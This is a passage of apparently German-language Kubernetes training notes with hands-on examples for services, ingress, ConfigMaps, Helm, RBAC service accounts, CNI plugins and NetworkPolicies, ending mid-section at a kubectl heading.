<img width="939" height="137" alt="image" src="https://github.com/user-attachments/assets/fb5a665b-98a7-445b-8ec7-27f12c2267e1" />


### Example 1: ClusterIP

#### Schritt 1: Deployment 

```
cd
mkdir -p manifests
cd manifests 
mkdir 04-service 
cd 04-service 
```

```
nano 01-deploy.yml
```

```
## 01-deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-nginx
spec:
  selector:
    matchLabels:
      run: my-nginx
  replicas: 3
  template:
    metadata:
      labels:
        run: my-nginx
    spec:
      containers:
      - name: my-nginx
        image: nginx
        ports:
        - containerPort: 80
```

```
kubectl apply -f .
```

#### Schritt 2:

```
nano 02-svc.yml
```

```
## 02-svc.yml 
apiVersion: v1
kind: Service
metadata:
  name: my-nginx
spec:
  ports:
  - port: 80
    protocol: TCP
  selector:
    run: my-nginx
```

```
kubectl apply -f . 
```

```
## wie ist die ClusterIP ?  
kubectl get all
kubectl get svc my-nginx
## Find endpoints / did svc find pods ?
kubectl describe svc my-nginx 
```

#### Schritt 3: Deployment löschen 

```
kubectl delete -f 01-deploy.yml
## Keine endpunkte mehr 
kubectl describe svc my-nginx
```

 ### Schritt 4: Deployment wieder erstellen 

```
kubectl apply -f .
## Endpunkte wieder da
kubectl describe svc my-nginx
```

### Example II : Short version (NodePort)

```
## Wo sind wir ?
## cd; cd manifests/04-service 
```

```
nano 02-svc.yml
## in Zeile type: 
## ClusterIP ersetzt durch NodePort 

kubectl apply -f .
## NodePort ab 30.000 ausfindig machen
kubectl get svc
```

<img width="793" height="44" alt="image" src="https://github.com/user-attachments/assets/16bf90d4-7c3f-4c8f-9846-2ff5d0e63fcf" />

```
kubectl get nodes -o wide
```

<img width="926" height="157" alt="image" src="https://github.com/user-attachments/assets/eb396f36-cff1-4b6d-b136-e110fff1c807" />

```
## im client Externe NodeIP und NodePort verwenden 
curl http://164.92.193.245:32708
```

### Example III: Service mit LoadBalancer (ExternalIP)

```
cd; cd manifests/04-service 
nano 02-svc.yml
## in Zeile type: 
## NodePort ersetzt durch LoadBalancer  

kubectl apply -f .
kubectl get svc svc-nginx

kubectl describe svc my-nginx
## hier heisst das nicht External-IP ->
## sondern
```

<img width="775" height="63" alt="image" src="https://github.com/user-attachments/assets/3f1db219-e5d8-4bbf-a001-17fc5eaae93f" />

```
kubectl get svc my-nginx -w 
## spätestens nach 5 Minuten bekommen wir eine externe ip
## z.B. 41.32.44.45

curl http://41.32.44.45 
```



### Ref.

  * https://kubernetes.io/docs/concepts/services-networking/connect-applications-service/

### Hintergrund Ingress




### Ref. / Dokumentation 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

### Ingress Controller auf Digitalocean (doks) mit helm installieren


### Basics 

  * Das Verfahren funktioniert auch so auf anderen Plattformen, wenn helm verwendet wird und noch kein IngressController vorhanden
  * Ist kein IngressController vorhanden, werden die Ingress-Objekte zwar angelegt, es funktioniert aber nicht. 

### Prerequisites 

  * kubectl muss eingerichtet sein 

### Walkthrough (Setup Ingress Controller) 

```
helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
helm repo update
helm show values ingress-nginx/ingress-nginx

## It will be setup with type loadbalancer - so waiting to retrieve an ip from the external loadbalancer
## This will take a little. 
helm install nginx-ingress ingress-nginx/ingress-nginx --namespace ingress --create-namespace --set controller.publishService.enabled=true 

## See when the external ip comes available
kubectl -n ingress get all
kubectl --namespace ingress get services -o wide -w nginx-ingress-ingress-nginx-controller

## Output  
NAME                                     TYPE           CLUSTER-IP     EXTERNAL-IP      PORT(S)                      AGE     SELECTOR
nginx-ingress-ingress-nginx-controller   LoadBalancer   10.245.78.34   157.245.20.222   80:31588/TCP,443:30704/TCP   4m39s   app.kubernetes.io/component=controller,app.kubernetes.io/instance=nginx-ingress,app.kubernetes.io/name=ingress-nginx

## Now setup wildcard - domain for training purpose 
## inwx.com
*.lab1.t3isp.de A 157.245.20.222 


```


### Documentation for default ingress nginx

  * https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/

### Beispiel Ingress


### Prerequisits

```
## Ingress Controller muss aktiviert sein 
microk8s enable ingress
```

### Walkthrough 

#### Schritt 1:

```
cd 
mkdir -p manifests
cd manifests 
mkdir abi
cd abi 
```


```
## apple.yml 
## vi apple.yml 
kind: Pod
apiVersion: v1
metadata:
  name: apple-app
  labels:
    app: apple
spec:
  containers:
    - name: apple-app
      image: hashicorp/http-echo
      args:
        - "-text=apple"
---

kind: Service
apiVersion: v1
metadata:
  name: apple-service
spec:
  selector:
    app: apple
  ports:
    - protocol: TCP
      port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f apple.yml 
```

```
## banana
## vi banana.yml
kind: Pod
apiVersion: v1
metadata:
  name: banana-app
  labels:
    app: banana
spec:
  containers:
    - name: banana-app
      image: hashicorp/http-echo
      args:
        - "-text=banana"

---

kind: Service
apiVersion: v1
metadata:
  name: banana-service
spec:
  selector:
    app: banana
  ports:
    - port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f banana.yml
```

#### Schritt 2:

```
## Ingress
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
spec:
  ingressClassName: nginx
  rules:
  - http:
      paths:
        - path: /apple
          backend:
            serviceName: apple-service
            servicePort: 80
        - path: /banana
          backend:
            serviceName: banana-service
            servicePort: 80
```

```
## ingress 
kubectl apply -f ingress.yml
kubectl get ing 
```

### Reference 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

### Find the problem 

```
## Hints 

## 1. Which resources does our version of kubectl support 
## Can we find Ingress as "Kind" here.
kubectl api-ressources 

## 2. Let's see, how the configuration works 
kubectl explain --api-version=networking.k8s.io/v1 ingress.spec.rules.http.paths.backend.service

## now we can adjust our config 
```

### Solution

```
## in kubernetes 1.22.2 - ingress.yml needs to be modified like so.
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
spec:
  ingressClassName: nginx
  rules:
  - http:
      paths:
        - path: /apple
          pathType: Prefix
          backend:
            service:
              name: apple-service
              port:
                number: 80
        - path: /banana
          pathType: Prefix
          backend:
            service:
              name: banana-service
              port:
                number: 80                
```

### Install Ingress On Digitalocean DOKS

### Beispiel mit Hostnamen


### Prerequisits

```
## Ingress Controller muss aktiviert sein 
### Nur der Fall wenn man microk8s zum Einrichten verwendet 
### Ubuntu 
microk8s enable ingress
```

### Walkthrough 

#### Step 1: pods and services

```
cd
mkdir -p manifests
cd manifests 
mkdir abi
cd abi
```

```
## apple.yml 
## vi apple.yml 
kind: Pod
apiVersion: v1
metadata:
  name: apple-app
  labels:
    app: apple
spec:
  containers:
    - name: apple-app
      image: hashicorp/http-echo
      args:
        - "-text=apple-<dein-name>"
---

kind: Service
apiVersion: v1
metadata:
  name: apple-service
spec:
  selector:
    app: apple
  ports:
    - protocol: TCP
      port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f apple.yml 
```

```
## banana
## vi banana.yml
kind: Pod
apiVersion: v1
metadata:
  name: banana-app
  labels:
    app: banana
spec:
  containers:
    - name: banana-app
      image: hashicorp/http-echo
      args:
        - "-text=banana-<dein-name>"

---

kind: Service
apiVersion: v1
metadata:
  name: banana-service
spec:
  selector:
    app: banana
  ports:
    - port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f banana.yml
```

### Step 2: Ingress 

```
## Ingress
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
    # with the ingress controller from helm, you need to set an annotation 
    # otherwice it does not know, which controller to use
    # old version... use ingressClassName instead 
    # kubernetes.io/ingress.class: nginx
spec:
  ingressClassName: nginx
  rules:
  - host: "<euername>.lab<nr>.t3isp.de"
    http:
      paths:
        - path: /apple
          backend:
            serviceName: apple-service
            servicePort: 80
        - path: /banana
          backend:
            serviceName: banana-service
            servicePort: 80
```

```
## ingress 
kubectl apply -f ingress.yml
kubectl get ing 
```

### Reference 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

### Find the problem 

```
## Hints 

## 1. Which resources does our version of kubectl support 
## Can we find Ingress as "Kind" here.
kubectl api-ressources 

## 2. Let's see, how the configuration works 
kubectl explain --api-version=networking.k8s.io/v1 ingress.spec.rules.http.paths.backend.service

## now we can adjust our config 
```

### Solution

```
## in kubernetes 1.22.2 - ingress.yml needs to be modified like so.
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
    # with the ingress controller from helm, you need to set an annotation 
    # old version useClassName instead 
    # otherwice it does not know, which controller to use
    # kubernetes.io/ingress.class: nginx 
spec:
  ingressClassName: nginx
  rules:
  - host: "app12.lab.t3isp.de"
    http:
      paths:
        - path: /apple
          pathType: Prefix
          backend:
            service:
              name: apple-service
              port:
                number: 80
        - path: /banana
          pathType: Prefix
          backend:
            service:
              name: banana-service
              port:
                number: 80                
```

### Achtung: Ingress mit Helm - annotations

### Permanente Weiterleitung mit Ingress


### Example

```
## redirect.yml 
apiVersion: v1
kind: Namespace
metadata:
  name: my-namespace

---

apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    nginx.ingress.kubernetes.io/permanent-redirect: https://www.google.de
    nginx.ingress.kubernetes.io/permanent-redirect-code: "308"
  creationTimestamp: null
  name: destination-home
  namespace: my-namespace
spec:
  rules:
  - host: web.training.local
    http:
      paths:
      - backend:
          service:
            name: http-svc
            port:
              number: 80
        path: /source
        pathType: ImplementationSpecific
```

```
Achtung: host-eintrag auf Rechner machen, von dem aus man zugreift 

/etc/hosts 
45.23.12.12 web.training.local
```


```
curl -I  http://web.training.local/source
HTTP/1.1 308 
Permanent Redirect 

```

### Umbauen zu google ;o) 

```
This annotation allows to return a permanent redirect instead of sending data to the upstream. For example nginx.ingress.kubernetes.io/permanent-redirect: https://www.google.com would redirect everything to Google.

```

### Refs:

  * https://github.com/kubernetes/ingress-nginx/blob/main/docs/user-guide/nginx-configuration/annotations.md#permanent-redirect
  * 

### ConfigMap Example


### Schritt 1: configmap vorbereiten 
```
cd 
mkdir -p manifests 
cd manifests
mkdir configmaptests 
cd configmaptests
nano 01-configmap.yml
```

```
### 01-configmap.yml
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: example-configmap 
data:
  # als Wertepaare
  database: mongodb
  database_uri: mongodb://localhost:27017
```

```
kubectl apply -f 01-configmap.yml 
kubectl get cm
kubectl get cm -o yaml
```

### Schritt 2: Beispiel als Datei 


```
nano 02-pod.yml
```

```
kind: Pod 
apiVersion: v1 
metadata:
  name: pod-mit-configmap 

spec:
  # Add the ConfigMap as a volume to the Pod
  volumes:
    # `name` here must match the name
    # specified in the volume mount
    - name: example-configmap-volume
      # Populate the volume with config map data
      configMap:
        # `name` here must match the name 
        # specified in the ConfigMap's YAML 
        name: example-configmap

  containers:
    - name: container-configmap
      image: nginx:latest
      # Mount the volume that contains the configuration data 
      # into your container filesystem
      volumeMounts:
        # `name` here must match the name
        # from the volumes section of this pod
        - name: example-configmap-volume
          mountPath: /etc/config


```

```
kubectl apply -f 02-pod.yml 
```

```
##Jetzt schauen wir uns den Container/Pod mal an
kubectl exec pod-mit-configmap -- ls -la /etc/config
kubectl exec -it pod-mit-configmap --  bash
## ls -la /etc/config 
```

### Schritt 3: Beispiel. ConfigMap als env-variablen 

```
nano 03-pod-mit-env.yml
```

```
## 03-pod-mit-env.yml 
kind: Pod 
apiVersion: v1 
metadata:
  name: pod-env-var 
spec:
  containers:
    - name: env-var-configmap
      image: nginx:latest 
      envFrom:
        - configMapRef:
            name: example-configmap

```

```
kubectl apply -f 03-pod-mit-env.yml
```

```
## und wir schauen uns das an 
##Jetzt schauen wir uns den Container/Pod mal an
kubectl exec pod-env-var -- env
kubectl exec -it pod-env-var --  bash
## env

```


### Reference: 

 * https://matthewpalmer.net/kubernetes-app-developer/articles/ultimate-configmap-guide-kubernetes.html

### Configmap MariaDB - Example


### Schritt 1: configmap 

```
cd 
mkdir -p manifests
cd manifests
mkdir cftest 
cd cftest 
nano 01-configmap.yml 
```

```
### 01-configmap.yml
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: mariadb-configmap 
data:
  # als Wertepaare
  MARIADB_ROOT_PASSWORD: 11abc432
```

```
kubectl apply -f .
kubectl get cm
kubectl get cm mariadb-configmap -o yaml
```


### Schritt 2: Deployment 
```
nano 02-deploy.yml
```

```
##deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mariadb-deployment
spec:
  selector:
    matchLabels:
      app: mariadb
  replicas: 1 
  template:
    metadata:
      labels:
        app: mariadb
    spec:
      containers:
      - name: mariadb-cont
        image: mariadb:latest
        envFrom:
        - configMapRef:
            name: mariadb-configmap

```

```
kubectl apply -f .
```

### Important Sidenode 

  * If configmap changes, deployment does not know
  * So kubectl apply -f deploy.yml will not have any effect
  * to fix, use stakater/reloader: https://github.com/stakater/Reloader


### Configmap MariaDB my.cnf


### configmap zu fuss 

```
vi mariadb-config2.yml 
```

```
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: example-configmap 
data:
  # als Wertepaare
  database: mongodb
  my.cnf: |
 [mysqld]
 slow_query_log = 1
 innodb_buffer_pool_size = 1G 
  
```

```
kubectl apply -f .
```

```
##deploy.yml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: mariadb-deployment
spec:
  selector:
    matchLabels:
      app: mariadb
  replicas: 1
  template:
    metadata:
      labels:
        app: mariadb
    spec:
      containers:
      - name: mariadb-cont
        image: mariadb:latest
        envFrom:
        - configMapRef:
            name: mariadb-configmap

        volumeMounts:
          - name: example-configmap-volume
            mountPath: /etc/my

      volumes:
      - name: example-configmap-volume
        configMap:
          name: example-configmap
```

```
kubectl apply -f .
```

## Helm (Kubernetes Paketmanager) 

### Helm Grundlagen


### Wo ? 

```
artifacts helm 

```

 * https://artifacthub.io/

### Komponenten 

```
Chart - beeinhaltet Beschreibung und Komponenten 
tar.gz - Format 
oder Verzeichnis 

Wenn wir ein Chart ausführen wird eine Release erstellen 
(parallel: image -> container, analog: chart -> release)
```

### Installation 

```
## Beispiel ubuntu 
## snap install --classic helm

## Cluster muss vorhanden, aber nicht notwendig wo helm installiert 

## Voraussetzung auf dem Client-Rechner (helm ist nichts als anderes als ein Client-Programm) 
Ein lauffähiges kubectl auf dem lokalen System (welches sich mit dem Cluster verbinden kann).
-> saubere -> .kube/config 

## Test
kubectl cluster-info 

```


### Helm Warum ?


```
Ein Paket für alle Komponenten
Einfaches Installieren, Updaten und deinstallieren 
Feststehende Struktur 
```

### Helm Example


### Prerequisites 

  * kubectl needs to be installed and configured to access cluster
  * Good: helm works as unprivileged user as well - Good for our setup 
  * install helm on ubuntu (client) as root: snap install --classic helm 
    * this installs helm3
  * Please only use: helm3. No server-side components needed (in cluster) 
    * Get away from examples using helm2 (hint: helm init) - uses tiller  

### Simple Walkthrough (Example 0)

```
## Repo hinzufpgen 
helm repo add bitnami https://charts.bitnami.com/bitnami 
## gecachte Informationen aktualieren 
helm repo update

helm search repo bitnami 
## helm install release-name bitnami/mysql
helm install my-mysql bitnami/mysql
## Chart runterziehen ohne installieren 
## helm pull bitnami/mysql

## Release anzeigen zu lassen
helm list 

## Status einer Release / Achtung, heisst nicht unbedingt nicht, dass pod läuft 
helm status my-mysql 

## weitere release installieren 
## helm install neuer-release-name  bitnami/mysql 


```

### Under the hood 

```
## Helm speichert Informationen über die Releases in den Secrets
kubectl get secrets | grep helm 


```


### Example 1: - To get know the structure 

```
helm repo add bitnami https://charts.bitnami.com/bitnami 
helm search repo bitnami 
helm repo update
helm pull bitnami/mysql 
tar xzvf mysql-9.0.0.tgz 

```



### Example 2: We will setup mysql without persistent storage (not helpful in production ;o() 

```
helm repo add bitnami https://charts.bitnami.com/bitnami 
helm search repo bitnami 
helm repo update

helm install my-mysql bitnami/mysql


```


### Example 2 - continue - fehlerbehebung 

```
helm uninstall my-mysql 
## Install with persistentStorage disabled - Setting a specific value 
helm install my-mysql --set primary.persistence.enabled=false bitnami/mysql

## just as notice 
## helm uninstall my-mysql 

```

### Example 2b: using a values file 

```
## mkdir helm-mysql
## cd helm-mysql
## vi values.yml 
primary:
  persistence:
    enabled: false 
```

```
helm uninstall my-mysql
helm install my-mysql bitnami/mysql -f values.yml 
```

### Example 3: Install wordpress 

```
helm repo add bitnami https://charts.bitnami.com/bitnami 
helm install my-wordpress \
  --set wordpressUsername=admin \
  --set wordpressPassword=password \
  --set mariadb.auth.rootPassword=secretpassword \
    bitnami/wordpress
```

### Example 4: Install Wordpress with values and auth 

```

## mkdir helm-mysql
## cd helm-mysql
## vi values.yml
persistence:
  enabled: false



wordpressUsername: admin
wordpressPassword: password
mariadb:
  primary:
    persistence:
      enabled: false

  auth:
    rootPassword: secretpassword


```

```
helm uninstall my-wordpress 
helm install my-wordpress bitnami/wordpress -f values 
```

### Referenced

  * https://github.com/bitnami/charts/tree/master/bitnami/mysql/#installing-the-chart
  * https://helm.sh/docs/intro/quickstart/

## Kubernetes - RBAC 

### Nutzer einrichten microk8s ab kubernetes 1.25


### Enable RBAC in microk8s 

```
## This is important, if not enable every user on the system is allowed to do everything 
microk8s enable rbac 
```

### Schritt 1: Nutzer-Account auf Server anlegen und secret anlegen / in Client 

```
cd 
mkdir -p manifests/rbac
cd manifests/rbac
```

####  Mini-Schritt 1: Definition für Nutzer 

```
## vi service-account.yml 
apiVersion: v1
kind: ServiceAccount
metadata:
  name: training
  namespace: default
```

```
kubectl apply -f service-account.yml 
```

#### Mini-Schritt 1.5: Secret erstellen 

  * From Kubernetes 1.25 tokens are not created automatically when creating a service account (sa)
  * You have to create them manually with annotation attached 
  * https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#create-token

```
## vi secret.yml 
apiVersion: v1
kind: Secret
type: kubernetes.io/service-account-token
metadata:
  name: trainingtoken
  annotations:
    kubernetes.io/service-account.name: training
```

```
kubectl apply -f .
```


#### Mini-Schritt 2: ClusterRolle festlegen - Dies gilt für alle namespaces, muss aber noch zugewiesen werden

```
### Bevor sie zugewiesen ist, funktioniert sie nicht - da sie keinem Nutzer zugewiesen ist 

## vi pods-clusterrole.yml 
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: pods-clusterrole
rules:
- apiGroups: [""] # "" indicates the core API group
  resources: ["pods"]
  verbs: ["get", "watch", "list"]
```

```
kubectl apply -f pods-clusterrole.yml 
```

#### Mini-Schritt 3: Die ClusterRolle den entsprechenden Nutzern über RoleBinding zu ordnen 
```
## vi rb-training-ns-default-pods.yml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: rolebinding-ns-default-pods
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: pods-clusterrole 
subjects:
- kind: ServiceAccount
  name: training
  namespace: default
```

```
kubectl apply -f rb-training-ns-default-pods.yml
```

#### Mini-Schritt 4: Testen (klappt der Zugang) 

```
kubectl auth can-i get pods -n default --as system:serviceaccount:default:training
```

### Schritt 2: Context anlegen / Credentials auslesen und in kubeconfig hinterlegen (bis Version 1.25.) 

#### Mini-Schritt 1: kubeconfig setzen 

```
kubectl config set-context training-ctx --cluster microk8s-cluster --user training

## extract name of the token from here 

TOKEN=`kubectl get secret trainingtoken -o jsonpath='{.data.token}' | base64 --decode`
echo $TOKEN
kubectl config set-credentials training --token=$TOKEN
kubectl config use-context training-ctx

## Hier reichen die Rechte nicht aus 
kubectl get deploy
## Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:kube-system:training" cannot list # resource "pods" in API group "" in the namespace "default"
```

#### Mini-Schritt 2:
```
kubectl config use-context training-ctx
kubectl get pods 
```

#### Mini-Schritt 3: Zurück zum alten Default-Context 

```
kubectl config get-contexts
```

```
CURRENT   NAME           CLUSTER            AUTHINFO    NAMESPACE
          microk8s       microk8s-cluster   admin2
*         training-ctx   microk8s-cluster   training2
```

```
kubectl config use-context microk8s  
```


### Refs:

  * https://docs.oracle.com/en-us/iaas/Content/ContEng/Tasks/contengaddingserviceaccttoken.htm
  * https://microk8s.io/docs/multi-user
  * https://faun.pub/kubernetes-rbac-use-one-role-in-multiple-namespaces-d1d08bb08286

### Ref: Create Service Account Token 

  * https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/#create-token

## Kubernetes - Netzwerk (CNI's) / Mesh

### Netzwerk Interna


### Network Namespace for each pod 

#### Overview 

![Overview](https://www.inovex.de/wp-content/uploads/2020/05/Container-to-Container-Networking_2_neu-400x401.png)
![Overview Kubernetes Networking](https://www.inovex.de/wp-content/uploads/2020/05/Container-to-Container-Networking_3_neu-400x412.png)

#### General 

  * Each pod will have its own network namespace
    * with routing, networkdevices 
  * Connection to default namespace to host is done through veth - Link to bridge on host network 
    * similar like on docker to docker0 
  
```
  Each container is connected to the bridge via a veth-pair. This interface pair functions like a virtual point-to-point ethernet connection and connects the network namespaces of the containers with the network namespace of the host
```
  
  * Every container is in the same Network Namespace, so they can communicate through localhost
    * Example with hashicorp/http-echo container 1 and busybox container 2 ? 
 
 
### Pod-To-Pod Communication (across nodes)  
 
#### Prerequisites 
 
  * pods on a single node as well as pods on a topological remote can establish communication at all times
   * Each pod receives a unique IP address, valid anywhere in the cluster. Kubernetes requires this address to not be subject to network address   translation (NAT)
   * Pods on the same node through virtual bridge (see image above)
 
#### General (what needs to be done) - and could be doen manually
 
   * local bridge networks of all nodes need to be connected
   * there needs to be an IPAM (IP-Address Managemenet) so addresses are only used once
   * The need to be routes so, that each bridge can communicate with the bridge on the other network
   * Plus: There needs to be a rule for incoming network
   * Also: A tunnel needs to be set up to the outside world.

#### General - Pod-to-Pod Communiation (across nodes) - what would need to be done

![pod to pod across nodes](https://www.inovex.de/wp-content/uploads/2020/05/Pod-to-Pod-Networking.png)


#### General - Pod-to-Pod Communication (side-note) 

  * This could of cause be done manually, but it is too complex 
  * So Kubernetes has created an Interface, which is well defined 
    * The interface is called CNI (common network interface) 
    * Funtionally is achieved through Network Plugin (which use this interface) 
      * e.g. calico / cilium / weave net / flannel 


#### CNI 

  * CNI only handles network connectivity of container and the cleanup of allocated resources (i.e. IP addresses) after containers have been deleted (garbage collection) and therefore is lightweight and quite easy to implement. 
  * There are some basic libraries within CNI which do some basic stuff.
 
   
    


### Hidden Pause Container 

#### What is for ? 

  * Holds the network - namespace for the pod 
  * Gets started first and falls asleep later 
  * Will still be there, when the other containers die 

```
cd 
mkdir -p manifests 
cd manifests 
mkdir pausetest
cd pausetest
nano 01-nginx.yml
```

```
## vi nginx-static.yml 

apiVersion: v1
kind: Pod
metadata:
  name: nginx-pausetest
  labels:
    webserver: nginx:1.21
spec:
  containers:
  - name: web
    image: nginx
```

```
kubectl apply -f .

ctr -n k8s.io c list | grep pause
```


### References 

  * https://www.inovex.de/de/blog/kubernetes-networking-part-1-en/
  * https://www.inovex.de/de/blog/kubernetes-networking-2-calico-cilium-weavenet/

### Übersicht Netzwerke


### CNI 

  * Common Network Interface
  * Feste Definition, wie Container mit Netzwerk-Bibliotheken kommunizieren

### Docker - Container oder andere 

  * Container wird hochgefahren -> über CNI -> zieht Netzwerk - IP  hoch. 
  * Container witd runtergahren -> uber CNI -> Netzwerk - IP wird released 

### Welche gibt es ? 

  * Flanel
  * Canal 
  * Calico 
  * Cilium
  * Weave Net 
  
### Flannel

#### Overlay - Netzwerk 

  * virtuelles Netzwerk was sich oben drüber und eigentlich auf Netzwerkebene nicht existiert
  * VXLAN 

#### Vorteile 

  * Guter einfacher Einstieg 
  * redziert auf eine Binary flanneld 

#### Nachteile 

  * keine Firewall - Policies möglich 
  * keine klassichen Netzwerk-Tools zum Debuggen möglich. 

### Canal 

#### General 

  * Auch ein Overlay - Netzwerk 
  * Unterstüzt auch policies 

### Calico

#### Generell 

  * klassische Netzwerk (BGP)

#### Vorteile gegenüber Flannel 

  * Policy über Kubernetes Object (NetworkPolicies)

#### Vorteile 

  * ISTIO integrierbar (Mesh - Netz) 
  * Performance etwas besser als Flannel (weil keine Encapsulation)

#### Referenz 
  * https://projectcalico.docs.tigera.io/security/calico-network-policy

### Weave Net 

  * Ähnlich calico 
  * Verwendet overlay netzwerk
  * Sehr stabil bzgl IPV4/IPV6 (Dual Stack) 
  * Sehr grosses Feature-Set 
  * mit das älteste Plugin 


### microk8s Vergleich 

  * https://microk8s.io/compare

```
snap.microk8s.daemon-flanneld
Flannel is a CNI which gives a subnet to each host for use with container runtimes.

Flanneld runs if ha-cluster is not enabled. If ha-cluster is enabled, calico is run instead.

The flannel daemon is started using the arguments in ${SNAP_DATA}/args/flanneld. For more information on the configuration, see the flannel documentation.
```

### Calico - nginx example NetworkPolicy


```
## Schritt 1:
kubectl create ns policy-demo
kubectl create deployment --namespace=policy-demo nginx --image=nginx
kubectl expose --namespace=policy-demo deployment nginx:1.21 --port=80
## lassen einen 2. pod laufen mit dem auf den nginx zugreifen 
kubectl run --namespace=policy-demo access --rm -ti --image busybox
```
```
## innerhalb der shell 
wget -q nginx -O -
```
```
## Schritt 2: Policy festlegen, dass kein Ingress-Traffic erlaubt
## in diesem namespace: policy-demo 
kubectl create -f - <<EOF
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: default-deny
  namespace: policy-demo
spec:
  podSelector:
    matchLabels: {}
EOF
## lassen einen 2. pod laufen mit dem auf den nginx zugreifen 
kubectl run --namespace=policy-demo access --rm -ti --image busybox
```

```
## innerhalb der shell 
wget -q nginx -O -
```

```
## Schritt 3: Zugriff erlauben von pods mit dem Label run=access 
kubectl create -f - <<EOF
kind: NetworkPolicy
apiVersion: networking.k8s.io/v1
metadata:
  name: access-nginx
  namespace: policy-demo
spec:
  podSelector:
    matchLabels:
      app: nginx
  ingress:
    - from:
      - podSelector:
          matchLabels:
            run: access
EOF

## lassen einen 2. pod laufen mit dem auf den nginx zugreifen 
## pod hat durch run -> access automatisch das label run:access zugewiesen 
kubectl run --namespace=policy-demo access --rm -ti --image busybox
```

```
## innerhalb der shell 
wget -q nginx -O -
```

``` 
kubectl run --namespace=policy-demo no-access --rm -ti --image busybox
```

```
## in der shell  
wget -q nginx -O -
```

```

kubectl delete ns policy-demo 

```


### Ref:

  * https://projectcalico.docs.tigera.io/security/tutorials/kubernetes-policy-basic

### Beispiele Ingress Egress NetworkPolicy


### Links 

  * https://github.com/ahmetb/kubernetes-network-policy-recipes
  * https://k8s-examples.container-solutions.com/examples/NetworkPolicy/NetworkPolicy.html

### Example with http (Cilium !!) 

```
apiVersion: "cilium.io/v2"
kind: CiliumNetworkPolicy
description: "L7 policy to restrict access to specific HTTP call"
metadata:
  name: "rule1"
spec:
  endpointSelector:
    matchLabels:
      type: l7-test
  ingress:
  - fromEndpoints:
    - matchLabels:
        org: client-pod
    toPorts:
    - ports:
      - port: "8080"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/discount"
```          
   
### Downside egress 

  * No valid api for anything other than IP's and/or Ports
  * If you want more, you have to use CNI-Plugin specific, e.g. 

#### Example egress with ip's 

```
## Allow traffic of all pods having the label role:app
## egress only to a specific ip and port 
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: test-network-policy
  namespace: default
spec:
  podSelector:
    matchLabels:
      role: app
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 10.10.0.0/16
    ports:
    - protocol: TCP 
      port: 5432
```

### Example Advanced Egress (cni-plugin specific) 

#### Cilium

```
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: "fqdn-pprof"
  namespace: msp
spec:
  endpointSelector:
    matchLabels:
      app: pprof
  egress:
  - toFQDNs:
    - matchPattern: '*.baidu.com'
  - toPorts:
    - ports:
      - port: "53"
        protocol: ANY
      rules:
        dns:
        - matchPattern: '*'
```

#### Calico 

  * Only Calico enterprise 
    * Calico Enterprise extends Calico’s policy model so that domain names (FQDN / DNS) can be used to allow access from a pod or set of pods (via label selector) to external resources outside of your cluster.
    * https://projectcalico.docs.tigera.io/security/calico-enterprise/egress-access-controls

#### Using isitio as mesh (e.g. with cilium/calico )

##### Installation of sidecar in calico 

  * https://projectcalico.docs.tigera.io/getting-started/kubernetes/hardway/istio-integration

##### Example 

```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: test-network-policy
  namespace: default
spec:
  podSelector:
    matchLabels:
      role: app
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 10.10.0.0/16
    ports:
    - protocol: TCP 
      port: 5432
```

### Mesh / istio


### Schaubild 

![istio Schaubild](https://istio.io/latest/docs/examples/virtual-machines/vm-bookinfo.svg)

### Istio 

```
## Visualization 
## with kiali (included in istio) 
https://istio.io/latest/docs/tasks/observability/kiali/kiali-graph.png

## Example 
## https://istio.io/latest/docs/examples/bookinfo/
The sidecars are injected in all pods within the namespace by labeling the namespace like so:
kubectl label namespace default istio-injection=enabled

## Gateway (like Ingress in vanilla Kubernetes) 
kubectl label namespace default istio-injection=enabled
```

### istio tls 

 * https://istio.io/latest/docs/ops/configuration/traffic-management/tls-configuration/


### istio - the next generation without sidecar 

  * https://istio.io/latest/blog/2022/introducing-ambient-mesh/

### Kubernetes Ports/Protokolle

  * https://kubernetes.io/docs/reference/networking/ports-and-protocols/

### IPV4/IPV6 Dualstack

  * https://kubernetes.io/docs/concepts/services-networking/dual-stack/

## kubectl 

### Start pod (container with run && examples)


### Beispiel 1 (das funktioniert)

```
## Zeigt mir die Pods die laufen
